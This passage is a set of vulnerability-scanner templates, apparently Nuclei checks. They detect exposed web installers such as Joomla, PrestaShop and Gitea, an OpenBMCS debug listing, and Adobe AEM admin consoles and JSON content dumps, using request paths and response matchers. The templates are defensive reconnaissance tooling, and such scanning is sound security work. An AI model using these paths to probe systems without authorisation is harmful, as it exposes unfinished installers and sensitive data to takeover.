- tags - misconfig,eshop,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/
### Matchers

**Type - word**
- part - body
- words
    1. eShop Installer
    2. Welcome to Installer
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# ESPEasy Installation Exposure
- severity - medium
- tags - misconfig,espeasy,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/ESPEasy
### Matchers

**Type - word**
- part - body
- words
    1. Install ESPEasy

**Type - status**
- status
    1. 200

---
# Vtiger CRM Installer Exposure
- severity - high
- tags - misconfig,vtiger,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?module=Install&view=Index
### Matchers

**Type - word**
- part - body
- words
    1. Installation Wizard
    2. Welcome to Vtiger CRM
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Codeigniter Application Installer Exposure
- severity - unknown
- tags - misconfig,codeigniter,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/
### Matchers

**Type - word**
- part - body
- words
    1. Codeigniter Application Installer

**Type - status**
- status
    1. 200

---
# Joomla! Installer Exposure
- severity - high
- tags - misconfig,joomla,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/installation/index.php
### Matchers

**Type - word**
- part - body
- words
    1. Joomla! Web Installer
    2. Configuration
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Piwik Installer Exposure
- severity - low
- tags - misconfig,piwik,install
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Piwik
    2. Installation status
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# phpwind Installer Exposure
- severity - high
- tags - misconfig,phpwind,exposure,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/install.php?a=check
### Matchers

**Type - word**
- part - body
- words
    1. Powered by phpwind\</title>
    2. 安装
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SMF Installer
- severity - high
- tags - misconfig,smf,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install.php
### Matchers

**Type - word**
- part - body
- words
    1. SMF Installer
    2. Progress
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Umbraco Install Exposure
- severity - high
- tags - misconfig,umbraco,install,oss
## Requests
- Method - GET
### URL
- {{BaseURL}}/install
### Matchers

**Type - word**
- part - body
- words
    1. Install Umbraco
    2. umbracoInstallPageBody
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SEO King - Shopify App — Installer
- severity - info
- tags - misconfig,shopify,install
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Shopify App — Installation
    2. example.myshopify.com
- condition - and

**Type - status**
- status
    1. 200

---
# Binom Installer Exposure
- severity - high
- tags - misconfig,binom,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/
- {{BaseURL}}/?page=step_1
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Install Binom\</title>
    2. System check
- condition - and

**Type - status**
- status
    1. 200

---
# SuiteCRM Installer Exposure
- severity - high
- tags - misconfig,suitecrm,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/install.php
### Matchers

**Type - word**
- part - body
- words
    1. SuiteCRM Setup Wizard:
    2. Checking Environment
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Pagekit Installer Exposure
- severity - high
- tags - misconfig,pagekit,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/installer
### Matchers

**Type - word**
- part - body
- words
    1. Pagekit Installer
    2. Connect database
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# UVDesk Installation Wizard
- severity - high
- tags - misconfig,uvdesk,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. UVDesk Helpdesk Community Edition
    2. Installation Wizard
- condition - and

**Type - status**
- status
    1. 200

---
# Tasmota Installer Exposure
- severity - high
- tags - misconfig,tasmota,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/
### Matchers

**Type - word**
- part - body
- words
    1. Install Tasmota
    2. Tasmota Installer
- condition - or

**Type - status**
- status
    1. 200

---
# Gitea Installer Exposure
- severity - medium
- tags - misconfig,gitea,install
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Installation -  Gitea: Git with a cup of tea
    2. Database Name
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Bagisto Installer Exposure
- severity - high
- tags - misconfig,bagisto,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/installer
### Matchers

**Type - word**
- part - body
- words
    1. Bagisto Installer

**Type - status**
- status
    1. 200

---
# Redash Installer Exposure
- severity - high
- tags - misconfig,redash,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/setup
### Matchers

**Type - word**
- part - body
- words
    1. Redash Initial Setup
    2. Admin User
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Contentify Installer Exposure
- severity - high
- tags - misconfig,contentify,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install
### Matchers

**Type - word**
- part - body
- words
    1. Contentify - Step 1
    2. start the installation
- condition - and

**Type - status**
- status
    1. 200

---
# Prestashop Installer Exposure
- severity - high
- tags - misconfig,prestashop,exposure,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/index.php
### Matchers

**Type - word**
- part - body
- words
    1. \<title>PrestaShop Installation Assistant\</title>
    2. \<li>System configuration\</li>
    3. \<li>Store installation\</li>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# UniFi Wizard Installer
- severity - high
- tags - misconfig,install,unifi,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/manage/wizard/
### Matchers

**Type - word**
- part - body
- words
    1. UniFi Wizard
    2. app-unifi-wizard
- condition - and

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- part - body
- group - 1
- regex
    1. window.unifiConfig.version = '(.*)'

---
# Lychee Installer
- severity - high
- tags - misconfig,lychee,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install
### Matchers

**Type - word**
- part - body
- words
    1. Lychee Installer

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# GeniusOcean Installer Exposure
- severity - high
- tags - misconfig,geniusocean,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/?step=1
### Matchers

**Type - word**
- part - body
- words
    1. GeniusOcean - Script Installer
    2. GeniusOcean Installer
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Blesta Installer Exposure
- severity - high
- tags - misconfig,blesta,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php/install
### Matchers

**Type - word**
- part - body
- words
    1. Blesta Installer
    2. Install via Web Browser
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Discourse Installer Exposure
- severity - unknown
- tags - misconfig,discourse,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/finish-installation/register
### Matchers

**Type - word**
- part - body
- words
    1. Discourse Setup
    2. Register Admin Account
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# GraphQL Playground
- severity - unknown
- tags - misconfig,graphql
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. \<title>GraphQL playground\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# OpenBMCS 2.4 Secrets Disclosure
## Description
- The application allows directory listing and information disclosure of some sensitive files that can allow an attacker to leverage the disclosed information and gain full BMS access
- severity - high
- tags - misconfig,edb,openbmcs
## Requests
- Method - GET
### URL
- {{BaseURL}}/debug/
### Matchers

**Type - word**
- words
    1. change_password_sqls
    2. Index of /debug
- condition - and

**Type - status**
- status
    1. 200

---
# Adobe AEM Misc Admin Dashboard Exposure
- severity - high
- tags - misconfig,aem,adobe,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/miscadmin
- {{BaseURL}}/mcmadmin#/content/dashboard
- {{BaseURL}}/miscadmin#/etc/mobile
- {{BaseURL}}/miscadmin#/etc/segmentation
- {{BaseURL}}/miscadmin#/etc/blueprints
- {{BaseURL}}/miscadmin#/etc/designs
- {{BaseURL}}/miscadmin#/etc/importers
- {{BaseURL}}/miscadmin#/etc/reports
- {{BaseURL}}/miscadmin#/etc/msm/rolloutconfigs
### Matchers

**Type - word**
- part - body
- words
    1. \<title>AEM Tools\</title>
    2. \<title>AEM MCM\</title>
- condition - or

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Adobe AEM Installed OSGI Bundles
- severity - low
- tags - misconfig,aem,adobe
## Requests
- Method - GET
### URL
- {{BaseURL}}/bin.tidy.infinity.json
### Matchers

**Type - word**
- words
    1. "jcr:primaryType":
    2. "jcr:uuid":
- condition - and

**Type - status**
- status
    1. 200

---
# Adobe AEM CRX Browser Exposure
- severity - unknown
- tags - misconfig,aem,adobe,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/crx/explorer/browser/index.jsp
### Matchers

**Type - word**
- words
    1. \<title>Content Explorer - UserID: anonymous | Workspace: crx.default\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Adobe AEM ACS Common Exposure
- severity - medium
- tags - misconfig,aem,adobe
## Requests
- Method - GET
### URL
- {{BaseURL}}/etc/acs-commons/jcr-compare.html
- {{BaseURL}}/etc/acs-commons/workflow-remover.html
- {{BaseURL}}/etc/acs-commons/version-compare.html
- {{BaseURL}}/etc/acs-commons/oak-index-manager.html
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Version Compare | ACS AEM Commons\</title>
    2. \<title>Oak Index Manager | ACS AEM Commons\</title>
    3. \<title>JCR Compare | ACS AEM Commons\</title>
    4. \<title>Workflow Remover | ACS AEM Commons\</title>
- condition - or

---
# Adobe AEM CRX Search Exposed
- severity - unknown
- tags - misconfig,aem,adobe,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/crx/explorer/ui/search.jsp
- {{BaseURL}}/crx/explorer/ui/search.jsp?Path=&amp;Query=
- {{BaseURL}}/crx/explorer/ui/search.jsp?Path=&Query=
### Matchers

**Type - word**
- words
    1. \<title>Search\</title>
    2. "/crx/explorer/ui/";
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Adobe AEM Custom Scripts Exposure
- severity - unknown
- tags - misconfig,aem,adobe
## Requests
- Method - GET
### URL
- {{BaseURL}}/apps.tidy.infinity.json
- {{BaseURL}}{{path}}
### Matchers

**Type - word**
- part - body
- words
    1. "jcr:primaryType":
    2. "jcr:createdBy":
- condition - and

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200
### Extractors

**Type - json**
- part - body
- name - path
- json
    1. .[]
- internal - True

---
# Adobe AEM Explorer NodeTypes Exposure
- severity - high
- tags - misconfig,aem,adobe,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/crx/explorer/nodetypes/index.jsp
### Matchers

**Type - word**
- words
    1. nodetypeadmin
    2. Registered Node Types
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Adobe AEM Disk Usage Information Disclosure
- severity - low
- tags - misconfig,aem,adobe,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/etc/reports/diskusage.html
- {{BaseURL}}/etc/reports/diskusage.html?path=/content/dam
### Matchers

**Type - word**
- words
    1. Disk Usage /
    2. \<th>nodes\</th>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Adobe AEM Debugging Client Libraries
- severity - info
- tags - misconfig,aem,adobe
## Requests
- Method - GET
### URL
- {{BaseURL}}/libs/cq/ui/content/dumplibs.html
- {{BaseURL}}/libs/granite/ui/content/dumplibs.validate.html
- {{BaseURL}}/libs/granite/ui/content/dumplibs.rebuild.html
- {{BaseURL}}/libs/granite/ui/content/dumplibs.test.html
- {{BaseURL}}/libs/granite/ui/content/dumplibs.html
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Client Libraries\</title>
    2. \<title>Rebuild Client Libraries\</title>
    3. \<title>Client Libraries Test Output\</title>
- condition - or

---
# Adobe AEM Security Users Exposure
- severity - medium
- tags - misconfig,aem,adobe,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/libs/granite/security/content/useradmin.html
### Matchers

**Type - word**
- words
    1. AEM Security | Users
    2. trackingelement="create user"
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Adobe AEM External Link Checker Exposure
- severity - unknown
- tags - misconfig,aem,adobe,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/etc/linkchecker.html
- {{BaseURL}}/var/linkchecker.html
### Matchers

**Type - word**
- words
    1. \<title>External Link Checker\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# AEM Dump Content Node Properties
- severity - medium
- tags - misconfig,aem,adobe
## Requests
- Method - GET
### URL
- {{BaseURL}}/content.infinity.json
- {{BaseURL}}/{{path}}
### Matchers

**Type - word**
- part - body
- words
    1. "rep:privileges":[

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200
### Extractors

**Type - json**
- part - body
- name - path
- json
    1. .[]
- internal - True

---
# Adobe AEM Sling User Info Servlet Exposure
- severity - info
- tags - misconfig,aem,adobe,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/system/sling/info.sessionInfo.json
- {{BaseURL}}/system/sling/info.sessionInfo.txt
### Matchers

**Type - word**
- words
    1. userID:

**Type - word**
- part - header
- words
    1. text/plain

**Type - status**
- status
    1. 200

---
# Adobe AEM Offloading Browser
- severity - medium
- tags - misconfig,aem,adobe
## Requests
- Method - GET
### URL
- {{BaseURL}}/libs/granite/offloading/content/view.html
### Matchers

**Type - word**
- words
    1. Offloading Browser
    2. >CLUSTER\</th>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# AEM BulkEditor
- severity - unknown
- tags - misconfig,aem,adobe,editor
## Requests
- Method - GET
### URL
- {{BaseURL}}/etc/importers/bulkeditor.html
### Matchers

**Type - word**
- part - body
- words
    1. \<title>AEM BulkEditor\</title>

**Type - status**
- status
    1. 200

---
